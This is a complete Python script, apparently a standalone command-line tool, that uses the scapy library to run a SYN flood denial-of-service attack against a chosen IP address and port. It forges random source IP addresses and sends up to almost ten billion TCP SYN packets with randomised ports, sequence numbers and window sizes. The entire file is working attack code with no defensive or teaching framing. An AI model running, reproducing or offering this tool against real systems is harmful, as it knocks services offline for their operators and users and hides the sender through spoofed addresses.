import random
from scapy.all import send, IP, TCP
import argparse

DEFAULT_PACKET_AMOUNT = 9999999999
MAX_PORTS = 65535

# IP Spoofing
def random_IP():
    IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP


def get_args():
    parser = argparse.ArgumentParser(description="SYN Flooder\n")
    parser.add_argument("t", help="Target IP Address")
    parser.add_argument(
        "-p", type=int, help="Target Port Number (Default:80)", default=80
    )
    parser.add_argument("-a", type=int, help="Number of packets to send (Default:999999999)", default=DEFAULT_PACKET_AMOUNT
    )
    args = parser.parse_args()
    return args.t, args.p, args.a


def SYN_flooder(T_IP, dPort, packets_to_send):
    print(
        "Starting SYN flood attack against %s with %s packets to port %s"
        % (T_IP, packets_to_send, dPort)
    )
    total = 0
    for x in range(0, packets_to_send):
        seq_num = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        window = random.randint(0, MAX_PORTS)
        src_ip = random_IP()
        packet = IP(dst=T_IP, src=src_ip) / TCP(
            sport=sPort, dport=dPort, flags="S", seq=seq_num, window=window
        )
        send(packet, verbose=0)

    print("Attack finished")
    
def main():
    T_IP, dPort, packets_to_send = get_args()
    SYN_flooder(T_IP, dPort, packets_to_send)

if __name__ == "__main__":
    main()
